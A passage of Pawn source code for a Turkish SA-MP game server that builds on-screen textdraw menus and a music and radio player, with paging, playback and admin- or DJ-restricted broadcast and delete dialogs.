	TMM_Radyo[playerid] = CreatePlayerTextDraw(playerid,536.000000, 333.000000, "Radyo");
	PlayerTextDrawAlignment(playerid,TMM_Radyo[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_Radyo[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Radyo[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Radyo[playerid], 0.209998, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Radyo[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_Radyo[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_Radyo[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_Radyo[playerid], 0);

	TMM_RadyoL[playerid] = CreatePlayerTextDraw(playerid,528.000000, 320.000000, "hud:radar_ryder");
	PlayerTextDrawAlignment(playerid,TMM_RadyoL[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_RadyoL[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_RadyoL[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_RadyoL[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_RadyoL[playerid], 16777215);
	PlayerTextDrawSetOutline(playerid,TMM_RadyoL[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_RadyoL[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_RadyoL[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_RadyoL[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_RadyoL[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_RadyoL[playerid], 16.000000, 15.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_RadyoL[playerid], 1);

	TMM_Ayarlar[playerid] = CreatePlayerTextDraw(playerid,563.000000, 333.000000, "Ayarlar");
	PlayerTextDrawAlignment(playerid,TMM_Ayarlar[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_Ayarlar[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Ayarlar[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Ayarlar[playerid], 0.209998, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Ayarlar[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_Ayarlar[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_Ayarlar[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_Ayarlar[playerid], 0);

	TMM_AyarlarL[playerid] = CreatePlayerTextDraw(playerid,555.000000, 320.000000, "hud:radar_modgarage");
	PlayerTextDrawAlignment(playerid,TMM_AyarlarL[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_AyarlarL[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_AyarlarL[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_AyarlarL[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_AyarlarL[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_AyarlarL[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_AyarlarL[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_AyarlarL[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_AyarlarL[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_AyarlarL[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_AyarlarL[playerid], 16.000000, 15.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_AyarlarL[playerid], 1);

	TMM_Banka[playerid] = CreatePlayerTextDraw(playerid,591.000000, 333.000000, "Banka");
	PlayerTextDrawAlignment(playerid,TMM_Banka[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_Banka[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Banka[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Banka[playerid], 0.209998, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Banka[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_Banka[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_Banka[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_Banka[playerid], 0);

	TMM_BankaL[playerid] = CreatePlayerTextDraw(playerid,583.000000, 320.000000, "hud:radar_cash");
	PlayerTextDrawAlignment(playerid,TMM_BankaL[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_BankaL[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_BankaL[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_BankaL[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_BankaL[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_BankaL[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_BankaL[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_BankaL[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_BankaL[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_BankaL[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_BankaL[playerid], 16.000000, 15.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_BankaL[playerid], 1);

	TMM_Krktr[playerid] = CreatePlayerTextDraw(playerid,615.000000, 333.000000, "Krktr");
	PlayerTextDrawAlignment(playerid,TMM_Krktr[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_Krktr[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Krktr[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Krktr[playerid], 0.209998, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Krktr[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_Krktr[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_Krktr[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_Krktr[playerid], 0);

	TMM_KrktrL[playerid] = CreatePlayerTextDraw(playerid,606.000000, 320.000000, "hud:radar_gangn");
	PlayerTextDrawAlignment(playerid,TMM_KrktrL[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_KrktrL[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_KrktrL[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_KrktrL[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_KrktrL[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_KrktrL[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_KrktrL[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_KrktrL[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_KrktrL[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_KrktrL[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_KrktrL[playerid], 16.000000, 15.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_KrktrL[playerid], 1);

	// Uygulama : MuzikCalar
	TMM_YeniL[playerid] = CreatePlayerTextDraw(playerid,564.000000, 317.000000, "hud:radar_hostpital");
	PlayerTextDrawAlignment(playerid,TMM_YeniL[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_YeniL[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_YeniL[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_YeniL[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_YeniL[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_YeniL[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_YeniL[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_YeniL[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_YeniL[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_YeniL[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_YeniL[playerid], 10.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_YeniL[playerid], 1);

	TMM_Yeni[playerid] = CreatePlayerTextDraw(playerid,574.500000, 317.000000, "Yeni");
	PlayerTextDrawBackgroundColor(playerid,TMM_Yeni[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Yeni[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Yeni[playerid], 0.209998, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Yeni[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_Yeni[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_Yeni[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_Yeni[playerid], 0);

	TMM_AraL[playerid] = CreatePlayerTextDraw(playerid,551.000000, 317.000000, "hud:radar_qmark");
	PlayerTextDrawAlignment(playerid,TMM_AraL[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,TMM_AraL[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_AraL[playerid], 4);
	PlayerTextDrawLetterSize(playerid,TMM_AraL[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,TMM_AraL[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_AraL[playerid], 0);
	PlayerTextDrawSetProportional(playerid,TMM_AraL[playerid], 1);
	PlayerTextDrawSetShadow(playerid,TMM_AraL[playerid], 1);
	PlayerTextDrawUseBox(playerid,TMM_AraL[playerid], 1);
	PlayerTextDrawBoxColor(playerid,TMM_AraL[playerid], 255);
	PlayerTextDrawTextSize(playerid,TMM_AraL[playerid], 10.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,TMM_AraL[playerid], 1);

	TMM_Ara[playerid] = CreatePlayerTextDraw(playerid,538.500000, 317.000000, "Ara");
	PlayerTextDrawBackgroundColor(playerid,TMM_Ara[playerid], 255);
	PlayerTextDrawFont(playerid,TMM_Ara[playerid], 1);
	PlayerTextDrawLetterSize(playerid,TMM_Ara[playerid], 0.209997, 0.899999);
	PlayerTextDrawColor(playerid,TMM_Ara[playerid], -1);
	PlayerTextDrawSetOutline(playerid,TMM_Ara[playerid], 1);
	PlayerTextDrawSetProportional(playerid,TMM_Ara[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,TMM_Ara[playerid], 0);

	return 1;
}

/* ESKÝ SÝSTEM
CMD:mp3(playerid, params[])
{
	if(MPde[playerid] > 0) return 1;
	SendAdminText(playerid, "/mp3", params);

	PlayerTextDrawShow(playerid, UI_MPHeadBox[playerid]);
	PlayerTextDrawShow(playerid, UI_MPMainBox[playerid]);
	PlayerTextDrawShow(playerid, UI_MPHeadBaslik[playerid]);
	PlayerTextDrawShow(playerid, UI_MPRadyoLogo[playerid]);
	PlayerTextDrawShow(playerid, UI_MPRadyoYazi[playerid]);
	PlayerTextDrawShow(playerid, UI_MPMuzikLogo[playerid]);
	PlayerTextDrawShow(playerid, UI_MPMuzikYazi[playerid]);

	PlayerTextDrawShow(playerid, UI_MPCMBox[playerid]);
	PlayerTextDrawShow(playerid, UI_MPCMArtwork[playerid]);
	PlayerTextDrawShow(playerid, UI_MPCMYazi[playerid]);
	PlayerTextDrawShow(playerid, UI_MPYMBox[playerid]);
	PlayerTextDrawShow(playerid, UI_MPYMLogo[playerid]);
	PlayerTextDrawShow(playerid, UI_MPYMYazi[playerid]);

	SelectTextDraw(playerid, 0xFF0000FF);

	MPde[playerid] = 1;

	MPSayfa[playerid] = 1;
	return 1;
}

MPUI_Update(playerid)
{
	new Yazi[1024];

	switch(MPMode[playerid])
	{
		case 0: // Kapalý
		{
		    format(Yazi, 1024, "~l~Muzik Calar'iniz Kapali");
		    PlayerTextDrawSetString(playerid, UI_MPCMYazi[playerid], Yazi);
		}

		case 1: // Server
		{
			if(MPde[playerid] > 0)
			{
		    	format(Yazi, 1024, "~l~Oynatilan Sarki~n~~b~%d# %s~n~~n~~l~Yayin~n~~b~Canakkale Meslek Sunucusu", CalanMP3ID, CalanMP3Name);
		    	PlayerTextDrawSetString(playerid, UI_MPCMYazi[playerid], Yazi);
			}
		}

		case 2: // Oyuncu Muzik
		{
			if(MPde[playerid] > 0)
			{
		    	format(Yazi, 1024, "~l~Oynatilan Sarki~n~~b~%s~n~~n~~l~Yayin~n~~b~MP3 Calar", MPName[playerid]);
		    	PlayerTextDrawSetString(playerid, UI_MPCMYazi[playerid], Yazi);
			}
		}

		case 3: // Radyo Muzik
		{
			if(MPde[playerid] > 0)
			{
		    	format(Yazi, 1024, "~l~Oynatilan Radyo~n~~b~%s~n~~n~~l~Yayin~n~~b~Radyo Calar", MPName[playerid]);
		    	PlayerTextDrawSetString(playerid, UI_MPCMYazi[playerid], Yazi);
			}
		}
	}

	switch(MPde[playerid])
	{
	    case 2: // Radyo
	    {
            new SenkronizeReyiz = ( ( (Iter_Count(Rads) - (Iter_Count(Rads) % 10)) / 10)   ) + 1;
			format(Yazi, 1024, "~w~Sayfa ~p~%d/%d", MPSayfa[playerid]+1, SenkronizeReyiz);
			PlayerTextDrawSetString(playerid, UI_MPSayfa[playerid], Yazi);
	    }

	    case 3: // Müzik
	    {
            new SenkronizeReyiz = ( ( (Iter_Count(MP3s) - (Iter_Count(MP3s) % 10)) / 10)   ) + 1;
			format(Yazi, 1024, "~w~Sayfa ~p~%d/%d", MPSayfa[playerid]+1, SenkronizeReyiz);
			PlayerTextDrawSetString(playerid, UI_MPSayfa[playerid], Yazi);
	    }
	}
}

MPUI_ClickTextDraw(playerid, Text:clickedid)
{
	if(clickedid == Text:INVALID_TEXT_DRAW && MPde[playerid] > 0)
	{
		PlayerTextDrawHide(playerid, UI_MPHeadBox[playerid]);
		PlayerTextDrawHide(playerid, UI_MPMainBox[playerid]);
		PlayerTextDrawHide(playerid, UI_MPHeadBaslik[playerid]);
		PlayerTextDrawHide(playerid, UI_MPRadyoLogo[playerid]);
		PlayerTextDrawHide(playerid, UI_MPRadyoYazi[playerid]);
		PlayerTextDrawHide(playerid, UI_MPMuzikLogo[playerid]);
		PlayerTextDrawHide(playerid, UI_MPMuzikYazi[playerid]);

		for(new i; i < 10; i++)
		{
			PlayerTextDrawHide(playerid, UI_MPItem[playerid][i]);
		}

		PlayerTextDrawHide(playerid, UI_MPCMBox[playerid]);
		PlayerTextDrawHide(playerid, UI_MPCMArtwork[playerid]);
		PlayerTextDrawHide(playerid, UI_MPCMYazi[playerid]);
		PlayerTextDrawHide(playerid, UI_MPYMBox[playerid]);
		PlayerTextDrawHide(playerid, UI_MPYMLogo[playerid]);
		PlayerTextDrawHide(playerid, UI_MPYMYazi[playerid]);
		PlayerTextDrawHide(playerid, UI_MPSayfa[playerid]);
		PlayerTextDrawHide(playerid, UI_MPOSayfa[playerid]);
		PlayerTextDrawHide(playerid, UI_MPSSayfa[playerid]);

		MPde[playerid] = 0;
	}
}

MPUI_ClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	if(MPde[playerid] == 0) return 1;
	new Yazi[300];

	if(playertextid == UI_MPRadyoLogo[playerid])
	{
		for(new i; i < 10; i++)
		{
		    PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
			PlayerTextDrawShow(playerid, UI_MPItem[playerid][i]);
			MPItem[playerid][i] = -1;
		}

		PlayerTextDrawHide(playerid, UI_MPRadyoLogo[playerid]);
		PlayerTextDrawHide(playerid, UI_MPRadyoYazi[playerid]);
		PlayerTextDrawHide(playerid, UI_MPMuzikLogo[playerid]);
		PlayerTextDrawHide(playerid, UI_MPMuzikYazi[playerid]);
		PlayerTextDrawShow(playerid, UI_MPSayfa[playerid]);
		PlayerTextDrawShow(playerid, UI_MPOSayfa[playerid]);
		PlayerTextDrawShow(playerid, UI_MPSSayfa[playerid]);

		MPde[playerid] = 2;
		MPSayfa[playerid] = 0;

		new Count, RCount;

		foreach(new i:Rads)
		{
			if(Count < MPSayfa[playerid] * 10)
			{
   				Count++;
			}else{
   				RCount++;

				if(RCount <= 10)
				{
				    MPItem[playerid][RCount-1] = i;
				    format(Yazi, 300, "~r~%d# ~w~%s", i, Radler[i][RadName]);
					PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
				}
			}
		}
		return 1;
	}

	if(playertextid == UI_MPMuzikLogo[playerid])
	{
		for(new i; i < 10; i++)
		{
		    PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
			PlayerTextDrawShow(playerid, UI_MPItem[playerid][i]);
 			MPItem[playerid][i] = -1;
		}

		PlayerTextDrawHide(playerid, UI_MPRadyoLogo[playerid]);
		PlayerTextDrawHide(playerid, UI_MPRadyoYazi[playerid]);
		PlayerTextDrawHide(playerid, UI_MPMuzikLogo[playerid]);
		PlayerTextDrawHide(playerid, UI_MPMuzikYazi[playerid]);
		PlayerTextDrawShow(playerid, UI_MPSayfa[playerid]);
		PlayerTextDrawShow(playerid, UI_MPOSayfa[playerid]);
		PlayerTextDrawShow(playerid, UI_MPSSayfa[playerid]);

		MPde[playerid] = 3;
		MPSayfa[playerid] = 0;

		new Count, RCount;

		foreach(new i:MP3s)
		{
			if(Count < MPSayfa[playerid] * 10)
			{
   				Count++;
			}else{
   				RCount++;

				if(RCount <= 10)
				{
				    MPItem[playerid][RCount-1] = i;
				    format(Yazi, 300, "~r~%d# ~w~%s", i, MP3ler[i][MP3Name]);
					PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
				}
			}
		}

	}
	if(playertextid == UI_MPYMLogo[playerid])
	{
		if(APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerDjLevel] < 2 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Sadece adminler ve 2 LEVEL Dj'ler Müzik veya radyo ekleyebilir!");
		switch(MPde[playerid])
		{
		    case 2: // Radyo
		    {
		        ShowPlayerDialog(playerid, DialogNewRadName, DIALOG_STYLE_INPUT, "{00FF00}Radyo Ekle - Radyo Adý", "{F8F8FF}Ekleyeceðiniz Radyo'nun adýný giriniz:", "Devam", "Ýptal");
		    }

		    case 3: // Müzik
		    {
		        ShowPlayerDialog(playerid, DialogNewMP3Name, DIALOG_STYLE_INPUT, "{00FF00}MP3 Ekle - Müzik Adý", "{F8F8FF}Ekleyeceðiniz MP3'ün adýný giriniz:", "Devam", "Ýptal");
		    }
		}
		return 1;
	}

	if(playertextid == UI_MPOSayfa[playerid])
	{
		switch(MPde[playerid])
		{
			case 2: // Radyo
			{
				if(MPSayfa[playerid] == 0) return 1;
  				for(new i; i < 10; i++)
				{
		    		PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
		    		MPItem[playerid][i] = -1;
				}

				MPSayfa[playerid]--;

  				new Count, RCount;

				foreach(new i:Rads)
				{
					if(Count < MPSayfa[playerid] * 10)
					{
   						Count++;
					}else{
   						RCount++;

						if(RCount <= 10)
						{
				    		MPItem[playerid][RCount-1] = i;
				    		format(Yazi, 300, "~r~%d# ~w~%s", i, Radler[i][RadName]);
							PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
						}
					}
				}
			}

			case 3: // Muzik
			{
				if(MPSayfa[playerid] == 0) return 1;
  				for(new i; i < 10; i++)
				{
		    		PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
		    		MPItem[playerid][i] = -1;
				}

				MPSayfa[playerid]--;

  				new Count, RCount;

				foreach(new i:MP3s)
				{
					if(Count < MPSayfa[playerid] * 10)
					{
   						Count++;
					}else{
   						RCount++;

						if(RCount <= 10)
						{
				    		MPItem[playerid][RCount-1] = i;
				    		format(Yazi, 300, "~r~%d# ~w~%s", i, MP3ler[i][MP3Name]);
							PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
						}
					}
				}
			}
		}
		return 1;
	}

	if(playertextid == UI_MPSSayfa[playerid])
	{
		switch(MPde[playerid])
		{
			case 2: // Radyo
			{
				new SenkronizeReyiz = ( ( (Iter_Count(Rads) - (Iter_Count(Rads) % 10)) / 10)   ) + 1;

				if(MPSayfa[playerid] == SenkronizeReyiz-1) return 1;
				for(new i; i < 10; i++)
				{
		    		PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
					MPItem[playerid][i] = -1;
				}

				MPSayfa[playerid]++;

  				new Count, RCount;

				foreach(new i:Rads)
				{
					if(Count < MPSayfa[playerid] * 10)
					{
   						Count++;
					}else{
   						RCount++;

						if(RCount <= 10)
						{
				    		MPItem[playerid][RCount-1] = i;
				    		format(Yazi, 300, "~r~%d# ~w~%s", i, Radler[i][RadName]);
							PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
						}
					}
				}
			}

			case 3: // Muzik
			{
				new SenkronizeReyiz = ( ( (Iter_Count(MP3s) - (Iter_Count(MP3s) % 10)) / 10)   ) + 1;

				if(MPSayfa[playerid] == SenkronizeReyiz-1) return 1;
				for(new i; i < 10; i++)
				{
		    		PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
					MPItem[playerid][i] = -1;
				}

				MPSayfa[playerid]++;

  				new Count, RCount;

				foreach(new i:MP3s)
				{
					if(Count < MPSayfa[playerid] * 10)
					{
   						Count++;
					}else{
   						RCount++;

						if(RCount <= 10)
						{
				    		MPItem[playerid][RCount-1] = i;
				    		format(Yazi, 300, "~r~%d# ~w~%s", i, MP3ler[i][MP3Name]);
							PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
						}
					}
				}
			}
		}
		return 1;
	}

	if(MPMuzikte[playerid] == true) return 1;
	for(new i; i < 10; i++)
	{
		if(playertextid == UI_MPItem[playerid][i])
		{
			switch(MPde[playerid])
			{
			    case 2: // Radyo
			    {
		    		if(MPItem[playerid][i] == -1) { SendClientMessage(playerid, -1, "{FF0000}Olmayan bir radyo istasyonunu seçemezsiniz."); break; }
					MPSItem[playerid] = i;
					MPMuzikte[playerid] = true;
					format(Yazi, 300, "{00FF00}%s", Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadName]);
						if(APlayerData[playerid][PlayerLevel] < 1 && APlayerData[playerid][PlayerDjLevel] < 2)
						{
					ShowPlayerDialog(playerid, DialogMP3ArsivInfo, DIALOG_STYLE_LIST, Yazi, "{FF0000}=> {F8F8FF}Radyoyu Oynat\n{FF0000}=> {F8F8FF}Radyoyu Herkese Oynat", "Seç", "Ýptal");
						}else
					ShowPlayerDialog(playerid, DialogMP3ArsivInfo, DIALOG_STYLE_LIST, Yazi, "{FF0000}=> {F8F8FF}Radyoyu Oynat\n{FF0000}=> {F8F8FF}Radyoyu Herkese Oynat\n{FF0000}=> {F8F8FF}Radyoyu Sil", "Seç", "Ýptal");
			    }

  			    case 3: // Müzik
			    {
		    		if(MPItem[playerid][i] == -1) { SendClientMessage(playerid, -1, "{FF0000}Olmayan bir müziði seçemezsiniz."); break; }
					MPSItem[playerid] = i;
					MPMuzikte[playerid] = true;
					format(Yazi, 300, "{00FF00}%s", MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Name]);
						if(APlayerData[playerid][PlayerLevel] < 1 && APlayerData[playerid][PlayerDjLevel] < 2)
						{
   						 ShowPlayerDialog(playerid, DialogMP3ArsivInfo2, DIALOG_STYLE_LIST, Yazi, "{FF0000}=> {F8F8FF}Müziði Oynat\n{FF0000}=> {F8F8FF}Müziði Herkese Oynat", "Seç", "Ýptal");
						}else
					ShowPlayerDialog(playerid, DialogMP3ArsivInfo, DIALOG_STYLE_LIST, Yazi, "{FF0000}=> {F8F8FF}Müziði Oynat\n{FF0000}=> {F8F8FF}Müziði Herkese Oynat\n{FF0000}=> {F8F8FF}Müziði Sil", "Seç", "Ýptal");
			    }
			}
			break;
		}
	}
	return 1;
}

MP3ArsivDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	//
	if(dialogid == DialogMP3ArsivInfo2)
	{
	    MPMuzikte[playerid] = false;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // MP3'ü Çal
	            {
	                	if(MP3ler[ MPSItem[playerid] ][MP3Exist] == 0) return 1;
						StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, MP3ler[ MPSItem[playerid] ][MP3URL]);
						format(MPName[playerid], 100, MP3ler[ MPSItem[playerid] ][MP3Name]);
						format(MPURL[playerid], 300, MP3ler[ MPSItem[playerid] ][MP3URL]);
						MPMode[playerid] = 2;
						SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçtiðiniz müziði dinlemeye baþladýnýz.");
	            }

	            case 1: // MP3'ü Herkese Çal
	            {
	                if(APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerDjLevel] == 0 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Bunu sadece yöneticiler /djler yapabilir!");
                    new Yazi[300];

						if(MP3ler[ MPSItem[playerid] ][MP3Exist] == 0) return 1;
						if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
						{
						format(Yazi, 300, "{FFCC00}» {FFFFFF}ADMIN %s, \"%s\" {F8F8FF}þarkýsýný açtý.", GetName(playerid), MP3ler[ MPSItem[playerid] ][MP3Name]);
						SendClientMessageToAll(-1, Yazi);
						}
						else
	  					{
	  					format(Yazi, 300, "{FFCC00}» {FFFFFF}DJ %s, \"%s\" {F8F8FF}þarkýsýný açtý.", GetName(playerid), MP3ler[ MPSItem[playerid] ][MP3Name]);
						SendClientMessageToAll(-1, Yazi);
						}

						SendClientMessageToAll(-1, "{F8F8FF}Þarkýyý dinlemek istemiyorsanýz {ADFF2F}/skapat {F8F8FF}yazabilirsiniz.");

                        CalanMP3ID = MPSItem[playerid];
						format(CalanMP3Name, 100, MP3ler[ MPSItem[playerid] ][MP3Name]);
						format(CalanMP3URL, 300, MP3ler[ MPSItem[playerid] ][MP3URL]);
						foreach(new i:Player)
						{
					    	if(MPMode[i] == 1)
					    	{
					    		PlayAudioStreamForPlayer(i, MP3ler[ MPSItem[playerid] ][MP3URL]);
							}
						}
	            }

	            case 2: // MP3'ü Sil
	            {
            		if(APlayerData[playerid][PlayerLevel] < 4 && APlayerData[playerid][PlayerDjLevel] < 2 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Bunu sadece 4 LEVEL üstü adminler ve 2 LEVEL Dj ler yapabilir !");
       					if(MP3ler[ MPSItem[playerid] ][MP3Exist] == 0) return 1;
         				MP3Sil(MPSItem[playerid]);
						SendClientMessage(playerid, -1, "{00FF00}Seçtiðiniz MP3 arþivden silindi.");
   				}
  			}
	    }
	}

	if(dialogid == DialogMP3ArsivInfo)
	{
	    MPMuzikte[playerid] = false;
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: // MP3'ü Çal
	            {
					if(MPde[playerid] == 2) // Radyo
	                {
	                	if(Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadExist] == 0) return 1;
						StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadURL]);
						format(MPName[playerid], 100, Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadName]);
						format(MPURL[playerid], 300, Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadURL]);
						MPMode[playerid] = 3;
						SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçtiðiniz radyo istasyonunu dinlemeye baþladýnýz.");
	                }else if(MPde[playerid] == 3) // Müzik
	                {
	                	if(MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Exist] == 0) return 1;
						StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3URL]);
						format(MPName[playerid], 100, MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Name]);
						format(MPURL[playerid], 300, MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3URL]);
						MPMode[playerid] = 2;
						SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Seçtiðiniz müziði dinlemeye baþladýnýz.");
					}
	            }

	            case 1: // MP3'ü Herkese Çal
	            {
	                if(APlayerData[playerid][PlayerLevel] == 0 && APlayerData[playerid][PlayerDjLevel] == 0 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Bunu sadece yöneticiler /djler yapabilir!");
                    new Yazi[300];
					if(MPde[playerid] == 2) // Radyo
	                {
						if(Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadExist] == 0) return 1;
						if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
						{
						format(Yazi, 300, "{FFCC00}» {FFFFFF}ADMIN %s, \"%s\" {F8F8FF}radyo istasyonunu açtý.", GetName(playerid), Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadName]);
						SendClientMessageToAll(-1, Yazi);
						}
						else
						{
						format(Yazi, 300, "{FFCC00}» {FFFFFF}Dj %s, \"%s\" {F8F8FF}radyo istasyonunu açtý.", GetName(playerid), Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadName]);
						SendClientMessageToAll(-1, Yazi);
						}
						SendClientMessageToAll(-1, "{F8F8FF}Þarkýyý dinlemek istemiyorsanýz {ADFF2F}/skapat {F8F8FF}yazabilirsiniz.");

						CalanMP3ID = MPItem[playerid][ MPSItem[playerid] ];
						format(CalanMP3Name, 100, Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadName]);
						format(CalanMP3URL, 300, Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadURL]);
						foreach(new i:Player)
						{
					    	if(MPMode[i] == 1)
					    	{
					    		PlayAudioStreamForPlayer(i, Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadURL]);
							}
						}
	                }else if(MPde[playerid] == 3) // Müzik
	                {
